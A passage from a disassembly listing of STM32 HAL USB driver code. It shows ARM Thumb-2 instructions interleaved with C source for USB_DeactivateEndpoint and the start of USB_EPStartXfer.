        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80065c2:	687a      	ldr	r2, [r7, #4]
 80065c4:	683b      	ldr	r3, [r7, #0]
 80065c6:	781b      	ldrb	r3, [r3, #0]
 80065c8:	009b      	lsls	r3, r3, #2
 80065ca:	4413      	add	r3, r2
 80065cc:	881b      	ldrh	r3, [r3, #0]
 80065ce:	b29b      	uxth	r3, r3
 80065d0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065d4:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80065d8:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 80065dc:	687a      	ldr	r2, [r7, #4]
 80065de:	683b      	ldr	r3, [r7, #0]
 80065e0:	781b      	ldrb	r3, [r3, #0]
 80065e2:	009b      	lsls	r3, r3, #2
 80065e4:	441a      	add	r2, r3
 80065e6:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 80065ea:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065ee:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065f2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80065f6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065fa:	b29b      	uxth	r3, r3
 80065fc:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80065fe:	687a      	ldr	r2, [r7, #4]
 8006600:	683b      	ldr	r3, [r7, #0]
 8006602:	781b      	ldrb	r3, [r3, #0]
 8006604:	009b      	lsls	r3, r3, #2
 8006606:	4413      	add	r3, r2
 8006608:	881b      	ldrh	r3, [r3, #0]
 800660a:	b29b      	uxth	r3, r3
 800660c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006610:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006614:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8006618:	687a      	ldr	r2, [r7, #4]
 800661a:	683b      	ldr	r3, [r7, #0]
 800661c:	781b      	ldrb	r3, [r3, #0]
 800661e:	009b      	lsls	r3, r3, #2
 8006620:	441a      	add	r2, r3
 8006622:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8006626:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800662a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800662e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006632:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006636:	b29b      	uxth	r3, r3
 8006638:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 800663a:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 800663e:	4618      	mov	r0, r3
 8006640:	3774      	adds	r7, #116	; 0x74
 8006642:	46bd      	mov	sp, r7
 8006644:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006648:	4770      	bx	lr
 800664a:	bf00      	nop

0800664c <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800664c:	b480      	push	{r7}
 800664e:	b08d      	sub	sp, #52	; 0x34
 8006650:	af00      	add	r7, sp, #0
 8006652:	6078      	str	r0, [r7, #4]
 8006654:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8006656:	683b      	ldr	r3, [r7, #0]
 8006658:	7b1b      	ldrb	r3, [r3, #12]
 800665a:	2b00      	cmp	r3, #0
 800665c:	f040 808e 	bne.w	800677c <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 8006660:	683b      	ldr	r3, [r7, #0]
 8006662:	785b      	ldrb	r3, [r3, #1]
 8006664:	2b00      	cmp	r3, #0
 8006666:	d044      	beq.n	80066f2 <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006668:	687a      	ldr	r2, [r7, #4]
 800666a:	683b      	ldr	r3, [r7, #0]
 800666c:	781b      	ldrb	r3, [r3, #0]
 800666e:	009b      	lsls	r3, r3, #2
 8006670:	4413      	add	r3, r2
 8006672:	881b      	ldrh	r3, [r3, #0]
 8006674:	81bb      	strh	r3, [r7, #12]
 8006676:	89bb      	ldrh	r3, [r7, #12]
 8006678:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800667c:	2b00      	cmp	r3, #0
 800667e:	d01b      	beq.n	80066b8 <USB_DeactivateEndpoint+0x6c>
 8006680:	687a      	ldr	r2, [r7, #4]
 8006682:	683b      	ldr	r3, [r7, #0]
 8006684:	781b      	ldrb	r3, [r3, #0]
 8006686:	009b      	lsls	r3, r3, #2
 8006688:	4413      	add	r3, r2
 800668a:	881b      	ldrh	r3, [r3, #0]
 800668c:	b29b      	uxth	r3, r3
 800668e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006692:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006696:	817b      	strh	r3, [r7, #10]
 8006698:	687a      	ldr	r2, [r7, #4]
 800669a:	683b      	ldr	r3, [r7, #0]
 800669c:	781b      	ldrb	r3, [r3, #0]
 800669e:	009b      	lsls	r3, r3, #2
 80066a0:	441a      	add	r2, r3
 80066a2:	897b      	ldrh	r3, [r7, #10]
 80066a4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066a8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066ac:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80066b0:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80066b4:	b29b      	uxth	r3, r3
 80066b6:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80066b8:	687a      	ldr	r2, [r7, #4]
 80066ba:	683b      	ldr	r3, [r7, #0]
 80066bc:	781b      	ldrb	r3, [r3, #0]
 80066be:	009b      	lsls	r3, r3, #2
 80066c0:	4413      	add	r3, r2
 80066c2:	881b      	ldrh	r3, [r3, #0]
 80066c4:	b29b      	uxth	r3, r3
 80066c6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066ca:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80066ce:	813b      	strh	r3, [r7, #8]
 80066d0:	687a      	ldr	r2, [r7, #4]
 80066d2:	683b      	ldr	r3, [r7, #0]
 80066d4:	781b      	ldrb	r3, [r3, #0]
 80066d6:	009b      	lsls	r3, r3, #2
 80066d8:	441a      	add	r2, r3
 80066da:	893b      	ldrh	r3, [r7, #8]
 80066dc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066e0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066e4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80066e8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80066ec:	b29b      	uxth	r3, r3
 80066ee:	8013      	strh	r3, [r2, #0]
 80066f0:	e192      	b.n	8006a18 <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80066f2:	687a      	ldr	r2, [r7, #4]
 80066f4:	683b      	ldr	r3, [r7, #0]
 80066f6:	781b      	ldrb	r3, [r3, #0]
 80066f8:	009b      	lsls	r3, r3, #2
 80066fa:	4413      	add	r3, r2
 80066fc:	881b      	ldrh	r3, [r3, #0]
 80066fe:	827b      	strh	r3, [r7, #18]
 8006700:	8a7b      	ldrh	r3, [r7, #18]
 8006702:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006706:	2b00      	cmp	r3, #0
 8006708:	d01b      	beq.n	8006742 <USB_DeactivateEndpoint+0xf6>
 800670a:	687a      	ldr	r2, [r7, #4]
 800670c:	683b      	ldr	r3, [r7, #0]
 800670e:	781b      	ldrb	r3, [r3, #0]
 8006710:	009b      	lsls	r3, r3, #2
 8006712:	4413      	add	r3, r2
 8006714:	881b      	ldrh	r3, [r3, #0]
 8006716:	b29b      	uxth	r3, r3
 8006718:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800671c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006720:	823b      	strh	r3, [r7, #16]
 8006722:	687a      	ldr	r2, [r7, #4]
 8006724:	683b      	ldr	r3, [r7, #0]
 8006726:	781b      	ldrb	r3, [r3, #0]
 8006728:	009b      	lsls	r3, r3, #2
 800672a:	441a      	add	r2, r3
 800672c:	8a3b      	ldrh	r3, [r7, #16]
 800672e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006732:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006736:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800673a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800673e:	b29b      	uxth	r3, r3
 8006740:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006742:	687a      	ldr	r2, [r7, #4]
 8006744:	683b      	ldr	r3, [r7, #0]
 8006746:	781b      	ldrb	r3, [r3, #0]
 8006748:	009b      	lsls	r3, r3, #2
 800674a:	4413      	add	r3, r2
 800674c:	881b      	ldrh	r3, [r3, #0]
 800674e:	b29b      	uxth	r3, r3
 8006750:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006754:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006758:	81fb      	strh	r3, [r7, #14]
 800675a:	687a      	ldr	r2, [r7, #4]
 800675c:	683b      	ldr	r3, [r7, #0]
 800675e:	781b      	ldrb	r3, [r3, #0]
 8006760:	009b      	lsls	r3, r3, #2
 8006762:	441a      	add	r2, r3
 8006764:	89fb      	ldrh	r3, [r7, #14]
 8006766:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800676a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800676e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006772:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006776:	b29b      	uxth	r3, r3
 8006778:	8013      	strh	r3, [r2, #0]
 800677a:	e14d      	b.n	8006a18 <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 800677c:	683b      	ldr	r3, [r7, #0]
 800677e:	785b      	ldrb	r3, [r3, #1]
 8006780:	2b00      	cmp	r3, #0
 8006782:	f040 80a5 	bne.w	80068d0 <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006786:	687a      	ldr	r2, [r7, #4]
 8006788:	683b      	ldr	r3, [r7, #0]
 800678a:	781b      	ldrb	r3, [r3, #0]
 800678c:	009b      	lsls	r3, r3, #2
 800678e:	4413      	add	r3, r2
 8006790:	881b      	ldrh	r3, [r3, #0]
 8006792:	843b      	strh	r3, [r7, #32]
 8006794:	8c3b      	ldrh	r3, [r7, #32]
 8006796:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800679a:	2b00      	cmp	r3, #0
 800679c:	d01b      	beq.n	80067d6 <USB_DeactivateEndpoint+0x18a>
 800679e:	687a      	ldr	r2, [r7, #4]
 80067a0:	683b      	ldr	r3, [r7, #0]
 80067a2:	781b      	ldrb	r3, [r3, #0]
 80067a4:	009b      	lsls	r3, r3, #2
 80067a6:	4413      	add	r3, r2
 80067a8:	881b      	ldrh	r3, [r3, #0]
 80067aa:	b29b      	uxth	r3, r3
 80067ac:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80067b0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067b4:	83fb      	strh	r3, [r7, #30]
 80067b6:	687a      	ldr	r2, [r7, #4]
 80067b8:	683b      	ldr	r3, [r7, #0]
 80067ba:	781b      	ldrb	r3, [r3, #0]
 80067bc:	009b      	lsls	r3, r3, #2
 80067be:	441a      	add	r2, r3
 80067c0:	8bfb      	ldrh	r3, [r7, #30]
 80067c2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067c6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067ca:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80067ce:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067d2:	b29b      	uxth	r3, r3
 80067d4:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80067d6:	687a      	ldr	r2, [r7, #4]
 80067d8:	683b      	ldr	r3, [r7, #0]
 80067da:	781b      	ldrb	r3, [r3, #0]
 80067dc:	009b      	lsls	r3, r3, #2
 80067de:	4413      	add	r3, r2
 80067e0:	881b      	ldrh	r3, [r3, #0]
 80067e2:	83bb      	strh	r3, [r7, #28]
 80067e4:	8bbb      	ldrh	r3, [r7, #28]
 80067e6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80067ea:	2b00      	cmp	r3, #0
 80067ec:	d01b      	beq.n	8006826 <USB_DeactivateEndpoint+0x1da>
 80067ee:	687a      	ldr	r2, [r7, #4]
 80067f0:	683b      	ldr	r3, [r7, #0]
 80067f2:	781b      	ldrb	r3, [r3, #0]
 80067f4:	009b      	lsls	r3, r3, #2
 80067f6:	4413      	add	r3, r2
 80067f8:	881b      	ldrh	r3, [r3, #0]
 80067fa:	b29b      	uxth	r3, r3
 80067fc:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006800:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006804:	837b      	strh	r3, [r7, #26]
 8006806:	687a      	ldr	r2, [r7, #4]
 8006808:	683b      	ldr	r3, [r7, #0]
 800680a:	781b      	ldrb	r3, [r3, #0]
 800680c:	009b      	lsls	r3, r3, #2
 800680e:	441a      	add	r2, r3
 8006810:	8b7b      	ldrh	r3, [r7, #26]
 8006812:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006816:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800681a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800681e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006822:	b29b      	uxth	r3, r3
 8006824:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 8006826:	687a      	ldr	r2, [r7, #4]
 8006828:	683b      	ldr	r3, [r7, #0]
 800682a:	781b      	ldrb	r3, [r3, #0]
 800682c:	009b      	lsls	r3, r3, #2
 800682e:	4413      	add	r3, r2
 8006830:	881b      	ldrh	r3, [r3, #0]
 8006832:	b29b      	uxth	r3, r3
 8006834:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006838:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800683c:	833b      	strh	r3, [r7, #24]
 800683e:	687a      	ldr	r2, [r7, #4]
 8006840:	683b      	ldr	r3, [r7, #0]
 8006842:	781b      	ldrb	r3, [r3, #0]
 8006844:	009b      	lsls	r3, r3, #2
 8006846:	441a      	add	r2, r3
 8006848:	8b3b      	ldrh	r3, [r7, #24]
 800684a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800684e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006852:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006856:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800685a:	b29b      	uxth	r3, r3
 800685c:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 800685e:	687a      	ldr	r2, [r7, #4]
 8006860:	683b      	ldr	r3, [r7, #0]
 8006862:	781b      	ldrb	r3, [r3, #0]
 8006864:	009b      	lsls	r3, r3, #2
 8006866:	4413      	add	r3, r2
 8006868:	881b      	ldrh	r3, [r3, #0]
 800686a:	b29b      	uxth	r3, r3
 800686c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006870:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006874:	82fb      	strh	r3, [r7, #22]
 8006876:	687a      	ldr	r2, [r7, #4]
 8006878:	683b      	ldr	r3, [r7, #0]
 800687a:	781b      	ldrb	r3, [r3, #0]
 800687c:	009b      	lsls	r3, r3, #2
 800687e:	441a      	add	r2, r3
 8006880:	8afb      	ldrh	r3, [r7, #22]
 8006882:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006886:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800688a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800688e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006892:	b29b      	uxth	r3, r3
 8006894:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006896:	687a      	ldr	r2, [r7, #4]
 8006898:	683b      	ldr	r3, [r7, #0]
 800689a:	781b      	ldrb	r3, [r3, #0]
 800689c:	009b      	lsls	r3, r3, #2
 800689e:	4413      	add	r3, r2
 80068a0:	881b      	ldrh	r3, [r3, #0]
 80068a2:	b29b      	uxth	r3, r3
 80068a4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068a8:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80068ac:	82bb      	strh	r3, [r7, #20]
 80068ae:	687a      	ldr	r2, [r7, #4]
 80068b0:	683b      	ldr	r3, [r7, #0]
 80068b2:	781b      	ldrb	r3, [r3, #0]
 80068b4:	009b      	lsls	r3, r3, #2
 80068b6:	441a      	add	r2, r3
 80068b8:	8abb      	ldrh	r3, [r7, #20]
 80068ba:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068be:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068c2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068c6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068ca:	b29b      	uxth	r3, r3
 80068cc:	8013      	strh	r3, [r2, #0]
 80068ce:	e0a3      	b.n	8006a18 <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80068d0:	687a      	ldr	r2, [r7, #4]
 80068d2:	683b      	ldr	r3, [r7, #0]
 80068d4:	781b      	ldrb	r3, [r3, #0]
 80068d6:	009b      	lsls	r3, r3, #2
 80068d8:	4413      	add	r3, r2
 80068da:	881b      	ldrh	r3, [r3, #0]
 80068dc:	85fb      	strh	r3, [r7, #46]	; 0x2e
 80068de:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 80068e0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80068e4:	2b00      	cmp	r3, #0
 80068e6:	d01b      	beq.n	8006920 <USB_DeactivateEndpoint+0x2d4>
 80068e8:	687a      	ldr	r2, [r7, #4]
 80068ea:	683b      	ldr	r3, [r7, #0]
 80068ec:	781b      	ldrb	r3, [r3, #0]
 80068ee:	009b      	lsls	r3, r3, #2
 80068f0:	4413      	add	r3, r2
 80068f2:	881b      	ldrh	r3, [r3, #0]
 80068f4:	b29b      	uxth	r3, r3
 80068f6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068fa:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068fe:	85bb      	strh	r3, [r7, #44]	; 0x2c
 8006900:	687a      	ldr	r2, [r7, #4]
 8006902:	683b      	ldr	r3, [r7, #0]
 8006904:	781b      	ldrb	r3, [r3, #0]
 8006906:	009b      	lsls	r3, r3, #2
 8006908:	441a      	add	r2, r3
 800690a:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 800690c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006910:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006914:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006918:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800691c:	b29b      	uxth	r3, r3
 800691e:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006920:	687a      	ldr	r2, [r7, #4]
 8006922:	683b      	ldr	r3, [r7, #0]
 8006924:	781b      	ldrb	r3, [r3, #0]
 8006926:	009b      	lsls	r3, r3, #2
 8006928:	4413      	add	r3, r2
 800692a:	881b      	ldrh	r3, [r3, #0]
 800692c:	857b      	strh	r3, [r7, #42]	; 0x2a
 800692e:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006930:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006934:	2b00      	cmp	r3, #0
 8006936:	d01b      	beq.n	8006970 <USB_DeactivateEndpoint+0x324>
 8006938:	687a      	ldr	r2, [r7, #4]
 800693a:	683b      	ldr	r3, [r7, #0]
 800693c:	781b      	ldrb	r3, [r3, #0]
 800693e:	009b      	lsls	r3, r3, #2
 8006940:	4413      	add	r3, r2
 8006942:	881b      	ldrh	r3, [r3, #0]
 8006944:	b29b      	uxth	r3, r3
 8006946:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800694a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800694e:	853b      	strh	r3, [r7, #40]	; 0x28
 8006950:	687a      	ldr	r2, [r7, #4]
 8006952:	683b      	ldr	r3, [r7, #0]
 8006954:	781b      	ldrb	r3, [r3, #0]
 8006956:	009b      	lsls	r3, r3, #2
 8006958:	441a      	add	r2, r3
 800695a:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 800695c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006960:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006964:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006968:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800696c:	b29b      	uxth	r3, r3
 800696e:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 8006970:	687a      	ldr	r2, [r7, #4]
 8006972:	683b      	ldr	r3, [r7, #0]
 8006974:	781b      	ldrb	r3, [r3, #0]
 8006976:	009b      	lsls	r3, r3, #2
 8006978:	4413      	add	r3, r2
 800697a:	881b      	ldrh	r3, [r3, #0]
 800697c:	b29b      	uxth	r3, r3
 800697e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006982:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006986:	84fb      	strh	r3, [r7, #38]	; 0x26
 8006988:	687a      	ldr	r2, [r7, #4]
 800698a:	683b      	ldr	r3, [r7, #0]
 800698c:	781b      	ldrb	r3, [r3, #0]
 800698e:	009b      	lsls	r3, r3, #2
 8006990:	441a      	add	r2, r3
 8006992:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 8006994:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006998:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800699c:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80069a0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069a4:	b29b      	uxth	r3, r3
 80069a6:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80069a8:	687a      	ldr	r2, [r7, #4]
 80069aa:	683b      	ldr	r3, [r7, #0]
 80069ac:	781b      	ldrb	r3, [r3, #0]
 80069ae:	009b      	lsls	r3, r3, #2
 80069b0:	4413      	add	r3, r2
 80069b2:	881b      	ldrh	r3, [r3, #0]
 80069b4:	b29b      	uxth	r3, r3
 80069b6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069ba:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80069be:	84bb      	strh	r3, [r7, #36]	; 0x24
 80069c0:	687a      	ldr	r2, [r7, #4]
 80069c2:	683b      	ldr	r3, [r7, #0]
 80069c4:	781b      	ldrb	r3, [r3, #0]
 80069c6:	009b      	lsls	r3, r3, #2
 80069c8:	441a      	add	r2, r3
 80069ca:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 80069cc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069d0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069d4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069d8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069dc:	b29b      	uxth	r3, r3
 80069de:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80069e0:	687a      	ldr	r2, [r7, #4]
 80069e2:	683b      	ldr	r3, [r7, #0]
 80069e4:	781b      	ldrb	r3, [r3, #0]
 80069e6:	009b      	lsls	r3, r3, #2
 80069e8:	4413      	add	r3, r2
 80069ea:	881b      	ldrh	r3, [r3, #0]
 80069ec:	b29b      	uxth	r3, r3
 80069ee:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80069f2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069f6:	847b      	strh	r3, [r7, #34]	; 0x22
 80069f8:	687a      	ldr	r2, [r7, #4]
 80069fa:	683b      	ldr	r3, [r7, #0]
 80069fc:	781b      	ldrb	r3, [r3, #0]
 80069fe:	009b      	lsls	r3, r3, #2
 8006a00:	441a      	add	r2, r3
 8006a02:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006a04:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a08:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a0c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a10:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a14:	b29b      	uxth	r3, r3
 8006a16:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8006a18:	2300      	movs	r3, #0
}
 8006a1a:	4618      	mov	r0, r3
 8006a1c:	3734      	adds	r7, #52	; 0x34
 8006a1e:	46bd      	mov	sp, r7
 8006a20:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006a24:	4770      	bx	lr

08006a26 <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006a26:	b580      	push	{r7, lr}
 8006a28:	b0c2      	sub	sp, #264	; 0x108
 8006a2a:	af00      	add	r7, sp, #0
 8006a2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a30:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006a34:	6018      	str	r0, [r3, #0]
 8006a36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a3e:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006a40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a44:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a48:	681b      	ldr	r3, [r3, #0]
 8006a4a:	785b      	ldrb	r3, [r3, #1]
 8006a4c:	2b01      	cmp	r3, #1
 8006a4e:	f040 86b7 	bne.w	80077c0 <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006a52:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a56:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a5a:	681b      	ldr	r3, [r3, #0]
 8006a5c:	699a      	ldr	r2, [r3, #24]
 8006a5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a62:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a66:	681b      	ldr	r3, [r3, #0]
 8006a68:	691b      	ldr	r3, [r3, #16]
 8006a6a:	429a      	cmp	r2, r3
 8006a6c:	d908      	bls.n	8006a80 <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006a6e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a72:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a76:	681b      	ldr	r3, [r3, #0]
 8006a78:	691b      	ldr	r3, [r3, #16]
 8006a7a:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006a7e:	e007      	b.n	8006a90 <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006a80:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a84:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a88:	681b      	ldr	r3, [r3, #0]
 8006a8a:	699b      	ldr	r3, [r3, #24]
 8006a8c:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006a90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a94:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a98:	681b      	ldr	r3, [r3, #0]
 8006a9a:	7b1b      	ldrb	r3, [r3, #12]
